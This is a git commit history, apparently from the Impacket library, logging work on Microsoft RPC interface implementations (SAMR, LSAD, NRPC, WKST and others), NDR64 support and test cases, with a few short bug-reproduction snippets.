Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 14 18:55:39 2014 +0000

    Helper functions for LSAT

commit 34451db6b8ab07967215688b9d62028cedbc4d53
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 14 17:12:31 2014 +0000

    Helper functions in place.. done!

commit 7ce38023e8a70d995c58ff9b16140b29d4d57f97
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 14 01:38:30 2014 +0000

    1) [MS-RRP] finished.. just need the helper functions
    2) Added another derefference to ndr setitem to help setting NULL pointers for RPC_UNICODE_STRING like structs

commit b568b5ada2b7cfe6729c640e7f931a082f916dfe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 13 15:26:42 2014 +0000

    More work on RPC_UNICODE_STRING

commit 3bf1172426be13b8c0c1e72aa723276329cf720a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 13 15:26:01 2014 +0000

    SAMPR_ULONG_ARRAY was wrongly defined

commit fce7bafadde72b567cd8dc733b86ff554ffd88f9
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 19:27:07 2014 +0000

    [MS-RRP] Interface Implementation. Not yet finished

commit abe6deddb89cbe4d3a92c488133a18789a2d3a5b
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 18:40:15 2014 +0000

    RPC_UNICODE_STRING() dump method is actually needed :s

commit b177e2b6bc955394b88ecae7864f97da5996c6fa
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 18:04:34 2014 +0000

    A much simpler RPC_UNICODE_STRING

commit 1d6263f59d4213ac3b7b66b39f54aec2538b1567
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 17:39:22 2014 +0000

    NDRBOOLEAN now prints True, False when dumping its contents

commit 35fe0f3ab4c3e45e0de9b06579faf73779b00156
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 16:04:21 2014 +0000

    Adding some more data types

commit a3fc72eeaafe7955dfc33a51b99efaabf3cfc25f
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 13:38:58 2014 +0000

    Moving the SMB-RPC test cases to a different directory

commit df18d1b0427c0d43bd6814636b7f6505e1f726f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 11 00:14:14 2014 +0000

    Added OPNUMS dictionaries

commit ed8aae1deadb585256c9d87407c3a6776c80c5b0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 22:27:02 2014 +0000

    Forgot to comment the tracebacks

commit 041c53a0f77084a4baca91d1ef896166f23432e7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 22:21:13 2014 +0000

    Migrated to the new RPC Runtime

commit d23a5aa6685e891bed0af40b46e3ac06415bf8a3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 21:53:59 2014 +0000

    Not needed anymore

commit aef50c4edd28c6d979dd49665ee43b108d64143a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 21:51:47 2014 +0000

    Adapted to the new RPC runtime

commit 258481c96bc4cdbbd69323d4dd8e6af0409b3ed0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 16:29:15 2014 +0000

    Updated test case + fix response structure for NetrUseEnum()

commit f650500fadbc5f4dba7cc64317e5424a14e25a3b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 15:30:00 2014 +0000

                # The RPC server MUST ensure that the RPC_C_AUTHN_NETLOGON security provider
                # (as specified in [MS-RPCE] section 2.2.1.1.7) and at least
                # RPC_C_AUTHN_LEVEL_PKT_INTEGRITY authentication level (as specified in
                # [MS-RPCE] section 2.2.1.1.8) are used in this RPC message.
                # Otherwise, the RPC server MUST return STATUS_ACCESS_DENIED.

commit 0180f6afd880e18a7dd481005ede320dac38b697
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 15:03:36 2014 +0000

    calls made to SamrSetDSRMPassword using NCACN_IP_TCP are rejected with RPC_S_ACCESS_DENIED.

commit 5d6eef41744b7f744e4907640ee7c0cf2eaa28a6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 14:57:41 2014 +0000

    NDRPOINTERNULL must be created again based on the NDR transfer syntax in use

commit 4bc2b68c6aee5c59b8be818a0cc5bc8c5805ab7f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 14:16:23 2014 +0000

    Moving some methods to the base class

commit bf980c3240553701d5d389a762cbc9025fe3ee2c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 10 13:48:41 2014 +0000

    Change in MSRPCBindAck base class

commit a3c810cd852ba1d9d29452c1b883c5e94f0cf9c6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 23:25:44 2014 +0000

    Updated to the new RPC Runtime

commit 4496a4658fd2651902564804b614d03023a1cb90
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 19:17:14 2014 +0000

    Ported to the new RPC runtime

commit 7f431841b60bdfcb09112db784072e0643ecb644
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 19:12:51 2014 +0000

    Same functionality as before, but ported to the new RPC runtime

commit 98b07863670ebc3c4201c48070f5e0fb7483b8e1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 18:46:43 2014 +0000

    Typo

commit e74e6e9d548c40f2ffde50afe8ff6749a0c18440
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 17:35:50 2014 +0000

    Bye bye.. we don't want you anymore.. replaced by nrpc.py

commit 3ad62a7d37994c82c0156637ca6639189e73c50e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 16:17:48 2014 +0000

    Enabled the TCPTransport testcase

commit a539ce6209d65e5f5b8409467a800a2c6832e84c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 16:11:21 2014 +0000

    We should respect the transfer_syntax previously choosen when doing an alter_ctx

commit 0a138a62127e4a56950fc97b45686529f082ca0c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 15:21:39 2014 +0000

    NETLOGON RPC_C_AUTHN_LEVEL_PKT_PRIVACY and RPC_C_AUTHN_LEVEL_PKT_INTEGRITY support. Right now just supporting RC4, not AES.

commit 01f134ed25eeebe2d81029c0cb7eddc972390971
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 9 15:20:45 2014 +0000

    SIGN() and SEAL() refactored so it makes it easier for users to consume these functions

commit 9f9db801214048c5754578c61e27d73b2f564a0b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 8 16:34:29 2014 +0000

    1) Fixed typos on som calls reponse's structures
    2) Added a dictionary with the opnums and their structures

commit d33a5c8ce7c562202e18ab58612d91aa4fc863f5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 8 14:54:02 2014 +0000

    changeTransferSyntax() needs to recreate some data types whenever we change to NDR64

commit 57cf1ce036c4b2dad503321548a9e869a4b07d73
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 8 12:35:19 2014 +0000

    Added NDR64 tests.. still some failing

commit 2f033cdb65078933b7f5290a8b0b1537c06b0c76
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 8 12:18:42 2014 +0000

    The alignment saga continues

commit dfff6f25e92da505d6ee671c43aed727c031d626
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 7 20:08:28 2014 +0000

    More alignment stuff + fix in nrpc DsrGetForestTrustInformation()

commit ca1d78743f10f9ffe194a15477aadbd867ddbd93
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 7 17:27:42 2014 +0000

    More padding and alignment stuff, in preparation for NDR64.

commit b5f65486bfb6747633c806697893ab1c08d25af3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 7 15:47:25 2014 +0000

    Forgot to change the call to NDR.getData()

commit 044653431fa9884b65f809a048f840cd979df8d8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 6 22:02:40 2014 +0000

    Fixed bug inside fromString when NDRUniConformantArray and NDRHYPER was present.
    This code wasn't working:
    from impacket.dcerpc.v5.ndr import *
    from impacket.dcerpc.v5.dtypes import *
    from impacket.winregistry import hexdump
    
    class Puta(NDRSTRUCT):
        structure = (
            ('Nose1', NDRLONG),
            ('Nose2', NDRLONG),
            ('Nose3', NDRLONG),
        )
    
    class Conformant(NDRSTRUCT):
        structure = (
            ('Item1', ULONG),
            ('Item2', USHORT),
            ('Item3', NDRSHORT),
            ('Item35', Puta),
            ('Item4', NDRUniConformantArray),
        )
    
    
    kk = Conformant()
    kk['Item1'] = 0xaa
    kk['Item2'] = 0xbb
    kk['Item3'] = 0xcc
    kk['Item4'] = ['a']
    kk.dump()
    
    hexdump(str(kk))
    nn = Conformant(str(kk))
    nn.dump()

commit 37bf2aad330ab2b6c4ea579db74d627aeaf40051
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 6 20:40:58 2014 +0000

    Getting rid of unnecesary align attributes

commit 0989d49f1d2eab4ca479b243073752cf0fcf8872
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 6 19:25:04 2014 +0000

    ept_lookup_handle_t redefinition plus simpler way to represent arrays

commit de18fe12b7df30a8c473b4529b1a2a6906abfd0e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 6 16:32:19 2014 +0000

    NDRSTRUCT data type created

commit 6876b8c3a76275ba8a3c89805e6769495d334d0e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 6 14:25:57 2014 +0000

    NDRCall -> NDRCALL
    NDRPointer -> NDRPOINTER
    NDRPointerNULL -> NDRPOINTERNULL
    NDRUnion -> NDRUNION
    
    dtypes.py now imports the datatypes directly

commit d2e796761834e4f2231361f1fc2d1759cb295e7f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 28 02:50:59 2013 +0000

    More NDR64

commit 14da66783f222f28fd9d5aec7fd33156f83310fe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 28 02:38:47 2013 +0000

    A much better RPC_SID using NDRUniConformantArray

commit 011d7be60495f4db72e5c8b2bc50bf1346901476
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 27 23:52:24 2013 +0000

    More NDR64 stuff.. not there yet :s

commit 2c4e5b65f93a800ffd1bc5d24efd509c010a653f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 27 22:29:12 2013 +0000

    Fixed bug when not initializing array items with the isNDR64 parameter

commit 57a8209546b2b0c76094b241b52ad3789a164a7a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 27 21:26:55 2013 +0000

    Better worked out the ARRAYs unpacking

commit 6009570a47dc81417f5eec5998889b3e16c4be63
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 27 18:37:31 2013 +0000

    More NDR64 work

commit 60aaf5cec4f0337378c6a07fc91862b967c3894c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 27 15:54:49 2013 +0000

    Added password command, so the users can change their passwords easily

commit 537f7850692fc5baccfb00f79ef37f77164d5c98
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 27 15:54:14 2013 +0000

    hashes support for hSamrUnicodeChangePasswordUser2() when changing passwords

commit 6a64046123c7669e8b3e9e703ee17befc18c25d5
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 26 16:41:55 2013 +0000

    Some updates related to NDR64, not ready yet

commit d4de2e49e2172f9667e03e4d453b96e5e933babb
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 26 13:56:47 2013 +0000

    Helper functions finished

commit a84ff937822b134e1849fb4a0afdaca14f376218
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 25 07:15:12 2013 +0000

    some helper functions added, more to go

commit 95e7501dd6af9a94aa5a08b562d7be065340d58e
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 22:40:35 2013 +0000

    More reliability

commit 617162125fa8b2c0e1c41763aa4f5391d14106e1
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 21:48:49 2013 +0000

    Wrong NDR type for some fields

commit 48769da4e195bf9a93f10b01d91f2d5bef411ed9
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 19:31:03 2013 +0000

    Fix problem when setting a NULL pointer for an RPC_UNICODE_STRING

commit 58384e1949eedb2a5d7b4b1f5fdcadb8f778f518
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 19:30:33 2013 +0000

    STRING changed for LPWSTR

commit 3bd8921848fd93036207baac17657ceafbe69933
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 19:29:53 2013 +0000

    Fixups

commit cf1168f665a822aa465366ff1e7e3efbd0640480
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 19:20:20 2013 +0000

    PSTRING not needed

commit ce37270597e3ce6f12260dcfc8206c6c3a3be5b4
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 24 19:19:58 2013 +0000

    Fix 8s for FIXED_ARRAY

commit 58253332de23bbb92179026e4000d20b89dda3f3
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 23 20:11:38 2013 +0000

    [MS-NRPC] Interface implementation + testcases... a few still to be solved

commit edd23dfb4119c55a13ef4cb80ae60fedeea38921
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 23 18:29:15 2013 +0000

    PSTRING replaced just for STRING

commit 0e46b5146373fea0d03562a15966d40aec13b269
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 22 20:50:42 2013 +0000

    The *Change*Password* methods are creating a temp account to play with the passwords

commit a41d2a9650f796d8b316bbea5428c43906f6e4c5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 22:02:25 2013 +0000

    I created primitive data types with signed / unsigned types.. and changed all the interfaces.. It should reflect what the docs say

commit 15ff10843ba8a985d91c8fb6c53e548d9795c8ad
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 20:56:09 2013 +0000

    Added more calls

commit 12d033e275d4a8d8cfe0d3d46001f103d7966565
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 19:51:38 2013 +0000

    1) No more UNIQUE_RPC_UNICODE_STRING
    2) RPC_UNICODE_STRING Length/MaximumLength put in the right order
    3) RPC_UNICODE_STRING generates a random ReferentID

commit 331106482a18b82d74c75361e468b24ec61b8337
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 19:41:15 2013 +0000

    I don't need these files here anymore

commit 6855b6e1ee35e000b68cd1f26a81c80d193aa20c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 19:38:08 2013 +0000

    MS-LSAT Inteface Implementation + test cases

commit 6b2950480a7d643b2c9400f50d4f2baf44c67305
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 18:11:31 2013 +0000

    Moving RPC_UNICODE_STRING_ARRAY to samr.py, small changes on lsad.py

commit dc5038c765af160fc94a966a782b0481fa0012d7
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 02:25:42 2013 +0000

    Added more tests

commit 060984cb55ec1d79105b6ab1b1f06d39450fb263
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 02:25:11 2013 +0000

    Slightly changes to make it more general

commit cc5ff3a8d5d974dafcce3adea8786fa83f617d74
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 00:15:51 2013 +0000

    Fixed testcase when closing my pipe

commit 2f791e4dc4f506ee198ac7b911c60d039c7f1915
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 00:15:24 2013 +0000

    Commented resp.dump()

commit 24a719a1c593cd369c089d4e37ee6d580b79ff8c
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 20 00:11:14 2013 +0000

     aimed at testing just the DCERPC engine, not the particular
     endpoints (we should do specific tests for endpoints)
     here we're using EPM just beacuse we need one, and it's the
     easiest one

commit 77f7efee37b209d708b5ccac911316f29e40cdfb
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 19 23:58:05 2013 +0000

    Modified some test cases to be more general and not dependants of the targets configuration

commit 99881090ed9ee2682284a6ee1dea264f6dc7d984
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 19 23:31:29 2013 +0000

    MS-LSAD partial implementation + testcases

commit 08b18a117d7e6c6d460faf887efae4683a35a916
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 19 21:30:58 2013 +0000

    Added PLARGE_INTEGER and LPSTR

commit a36ccf071408c97d64045e6e16f2c71c9d9c4041
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 19 20:48:48 2013 +0000

    Fixed a bug when trying to pack/unpack a pointer to a pointer of an array (yes :s ). This code wasn't working:
    from impacket.dcerpc.v5.ndr import *
    from impacket.dcerpc.v5.dtypes import *
    from impacket.winregistry import hexdump
    
    class PLPBYTE(NDRPointer):
        referent = (
            ('Data', LPBYTE),
        )
    
    class Conformant(NDR):
        structure = (
            ('Item1', NDRLONG),
            ('Item2', NDRLONG),
            ('Item3', NDRLONG),
            ('Array', PLPBYTE),
        )
    
    class Puta(NDRCall):
        structure = (
            ('Nose1', NDRLONG),
            ('LaCuestion', Conformant),
            ('Nose2', NDRLONG),
        )
    
    kk = Puta()
    kk['Nose1'] = 1
    kk['Nose2'] = 0xffffffff
    kk['LaCuestion']['Item1'] = 1
    kk['LaCuestion']['Item2'] = 2
    kk['LaCuestion']['Item3'] = 3
    kk['LaCuestion']['Array'] = list('BETOBETO')
    
    kk.dumpRaw()
    hexdump(str(kk))
    
    nn = Puta(str(kk))
    nn.dumpRaw()

commit ba8c62a7fe5f81c31d94dbce7ae06a4daed0baf4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 19 19:00:29 2013 +0000

    Added support for [C706] 14.3.7.1 and 14.3.7.2

commit 18b98a496def8c265ff6a6a63147652f8178ff1d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 17 22:46:17 2013 +0000

    Finished.. only helper functions left to do in the future

commit f60c95aea8e7bc5bf5a432033d68a1251e9c103b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 17 22:45:11 2013 +0000

    Added LUID

commit 814ca693838cb24f7571e4c9e4ec35b5dd27798c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 16 21:45:16 2013 +0000

    [MS-SRVS] Interface implementation + testcases
    
    Not finished yet

commit b137c471c39bae4711b3ce1b06a73498e21253f0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 16 21:43:15 2013 +0000

    Added 2.2.26 LMSTR

commit f2586cb8cd6308c6ca7fdd0a1b82942ec3c08424
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 16 21:42:49 2013 +0000

    When the pointer is NULL, just print NULL ;)

commit 03791ebf59d0559dcc76dd359c42ce1b013f3ce8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 16 19:21:49 2013 +0000

    Forgot to add the pad to the soFarItems

commit 427bdf028028b7f8bb11eee6a1965bfb529c4634
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 13 20:25:27 2013 +0000

    1) Added ability to specify the transfer_syntax when binding. NDR64 still not fully supported but this is useful for some stuff
    2) Fixed a bug when reporting an exception when binding

commit c87d8f394e1f1f703ccf00662bb9abd1b23d359a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 13 20:06:53 2013 +0000

    [MS-WKST] Interface implementation + testcases

commit 45e0e5576f472852cb6219f9c0c1d1d741d2caf8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 12 22:07:06 2013 +0000

    1) Target's data is taken from a single file. Easier for changing configuration
    2) Added TCPTransport test for all testcases

commit d5763bb77e7c7d2bed2a5218e82ad0451c248cbd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 12 22:04:21 2013 +0000

    1) More padding fixes :s
    2) NDRUnion should behave similar to an NDRCall. The pointers there should be top level pointers if the Union is part of the main NDR call structure. This could be done more clean, work to do.

commit 9dcee30aa41c00da7a731adde1c71d1941fc170a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 12 22:02:45 2013 +0000

    class LPLONG added

commit ffe83685fb5873da93d9550f9424789606cefd16
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 12 22:02:29 2013 +0000

    Changes to the exception handler based on previous commit

commit e144c2dd86d0206dc16efc00d3f7df3372730aeb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 12 22:01:54 2013 +0000

    If we cannot unpack the error packet, we just call the exception with the error_code

commit 727d747c8b2a73bcb429d2659f53cae94d5a6e9f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 12 00:45:47 2013 +0000

    fixed typo for ncacn_ip_tcp

commit 97e632e0a8dac20b2fc196bbbdb64e914f2c9c17
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 11 23:50:32 2013 +0000

    Final calls added.. all SAMR calls in place. In the future we should craft some helper functions to make it easier to use the calls. See testcases for example of use

commit 30f896fbf8d2730732b70f1d558e91cb9efe3837
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 11 23:49:12 2013 +0000

    1) __setitem__ set on those classes that calculate the length of a string or array so everything is recalculated when packing
    2) fix on getData where soFar was wrongly calculated

commit 61379744c8c81ab2074b2ba3ae333fd83d416a6f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 11 23:48:15 2013 +0000

    1) __setitem__ set on those classes that calculate the length of a string or array so everything is recalculated when packing
    2) Added ACL()/PACL() and SECURITY_DESCRIPTOR()/PSECURITY_DESCRIPTOR()

commit 456f370f3ed339e7a7e4d7fc2d527ec56486706b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 21:11:46 2013 +0000

    Based on previous commit, on those places where the NDRUnion tag is different from NDRSHORT, we gotta declare it

commit 76166893f141cfc2001ff5a940c80fc85b664bc4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 21:11:08 2013 +0000

    1) Making it cleaner the way we carry the bytes already processed for pad calculation
    2) NDRUnion default tag now is NDRSHORT
    2) NDRUnion default tag now is NDRSHORT

commit a16238259a75d8a92816847a0f1e2ba42c4c3137
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 20:20:54 2013 +0000

    Updated test case

commit 2d75c98ebb8f8fa89ca64df1a109982c4e3efed1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 20:20:16 2013 +0000

    Updated test cases

commit f9769af25980c88a44d3a14e78f33c38d6983eaa
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 20:19:24 2013 +0000

    Items reorganization + more calls.. close to finish

commit f77e5c528ae35f5d66fbadcafba6495b074bb16f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 20:18:08 2013 +0000

    changing getData(), fromString() according to previous changeset

commit 60a38cb5312b5cc724d64a52d454829214520596
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 20:16:52 2013 +0000

    changed fromString(), getData() according to previous changeset

commit fcd9755f00febdd999b5f38f830058e6a13cac98
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 10 20:15:31 2013 +0000

    getData() and fromString() now received a soFar variable that specified the bytes processed so far so PAD can be calculated over the ENTIRE octet stream

commit b9a89791b6f4fd08bde5046b881ce1660f1b720d
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 20:58:09 2013 +0000

    Added
    1) SamrDeleteUser
    2) SamrDeleteAlias
    3) SamrDeleteGroup
    4) SamrGetMembersInGroup
    5) SamrRemoveMemberFromGroup
    6) SamrAddMemberToGroup

commit e2c2f4efba187e4c6486236caa3f365a7344179c
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 17:24:10 2013 +0000

    Fixed bug when encryption/integrity was used

commit f5273bda186d6d6286ebb402debea2215149675c
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 17:19:03 2013 +0000

    Fixed bug when encryption/integrity was used

